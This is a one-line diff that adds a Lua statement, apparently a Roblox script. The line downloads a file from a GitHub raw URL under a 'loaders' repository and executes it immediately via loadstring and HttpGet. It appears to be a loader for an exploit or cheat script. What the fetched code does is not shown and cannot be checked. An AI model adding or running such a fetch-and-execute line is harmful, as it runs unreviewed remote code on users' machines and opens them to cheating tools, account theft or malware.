@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam7-udy037cgfiv1j5.lua"))()
